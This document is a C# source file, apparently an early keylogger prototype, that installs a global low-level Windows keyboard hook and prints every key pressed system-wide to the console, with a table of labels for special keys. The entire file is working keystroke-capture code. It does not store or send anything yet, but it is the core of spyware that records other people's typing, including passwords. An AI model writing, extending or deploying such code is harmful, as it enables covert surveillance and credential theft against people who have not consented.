using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace test_keylogger
{
    internal class Program
    {
        internal class KeyLogger
        {
            private readonly Dictionary<int, string> dic_NonPrintableKeys = new Dictionary<int, string>()
            {
                { 0x08, "[Backspace]" },
                { 0x09, "[Tab]" },
                { 0x0D, "[Enter]" },
                { 0x10, "[Shift]" },
                { 0x11, "[Ctrl]" },
                { 0x12, "[Alt]" },
                { 0x13, "[Pause]" },
                { 0x1B, "[Escape]" },
                { 0x20, "[Spacebar]" },
                { 0x21, "[PageUp]" },
                { 0x22, "[PageDown]" },
                { 0x23, "[End]" },
                { 0x24, "[Home]" },
                { 0x25, "[LeftArrow]" },
                { 0x26, "[UpArrow]" },
                { 0x27, "[RightArrow]" },
                { 0x28, "[DownArrow]" },
                { 0x29, "[Insert]" },
                { 0x2A, "[Delete]" },
                { 0x2B, "[Select]" },
                { 0x2C, "[PrintScreen]" },
                { 0x2D, "[Insert]" },
                { 0x2E, "[Delete]" },
                { 0x70, "[F1]" },
                { 0x71, "[F2]" },
                { 0x72, "[F3]" },
                { 0x73, "[F4]" },
                { 0x74, "[F5]" },
                { 0x75, "[F6]" },
                { 0x76, "[F7]" },
                { 0x77, "[F8]" },
                { 0x78, "[F9]" },
                { 0x79, "[F10]" },
                { 0x7A, "[F11]" },
                { 0x7B, "[F12]" },
                { 0x90, "[NumLock]" },
                { 0x91, "[ScrollLock]" },
                { 0xA0, "[LeftShift]" },
                { 0xA1, "[RightShift]" },
                { 0xA2, "[LeftCtrl]" },
                { 0xA3, "[RightCtrl]" },
                { 0xA4, "[LeftAlt]" },
                { 0xA5, "[RightAlt]" },
                { 0xA6, "[BrowserBack]" },
                { 0xA7, "[BrowserForward]" },
                { 0xA8, "[BrowserRefresh]" },
                { 0xA9, "[BrowserStop]" },
                { 0xAA, "[BrowserSearch]" },
                { 0xAB, "[BrowserFavorites]" },
                { 0xAC, "[BrowserHome]" },
                { 0xB0, "[Mute]" },
                { 0xB1, "[VolumeDown]" },
                { 0xB2, "[VolumeUp]" },
                { 0xB3, "[NextTrack]" },
                { 0xB4, "[PreviousTrack]" },
                { 0xB5, "[StopMedia]" },
                { 0xB6, "[PlayPauseMedia]" },
                { 0xB7, "[LaunchMail]" },
                { 0xB8, "[SelectMedia]" },
                { 0xB9, "[LaunchApplication1]" },
                { 0xBA, "[Semicolon]" },
                { 0xBB, "[Plus]" },
                { 0xBC, "[Comma]" },
                { 0xBD, "[Minus]" },
                { 0xBE, "[Period]" },
                { 0xBF, "[Slash]" },
                { 0xC0, "[GraveAccent]" }
            };
            
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, [Out] byte[] lpChar, uint uFlags);

            private static IntPtr _hookID = IntPtr.Zero;

            public void Main()
            {
                _hookID = SetHook(HookCallback);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }

            private IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    // Handle specific key presses here
                    byte[] keyState = new byte[256];
                    byte[] keyOutput = new byte[2];

                    // Get the current state of the keyboard
                    if (ToAscii((uint)vkCode, 0, keyState, keyOutput, 0) == 1)
                    {
                        char keyChar = (char)keyOutput[0];
                        Console.WriteLine($"Key pressed: {keyChar}, vkCode: {vkCode}");
                    }
                    else
                    {
                        try
                        {
                            Console.WriteLine($"Key pressed: {dic_NonPrintableKeys[vkCode]}, vkCode: {vkCode} (Non-printable or function key)");
                        }
                        catch
                        {
                            Console.WriteLine(vkCode.ToString("X"));
                            Console.WriteLine(key);
                        }
                    }
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
                //return CallNextHookEx(IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
            }
        }

        static void Main(string[] args)
        {
            KeyLogger keylogger = new KeyLogger();
            keylogger.Main();
            Console.ReadKey();
        }
    }
}
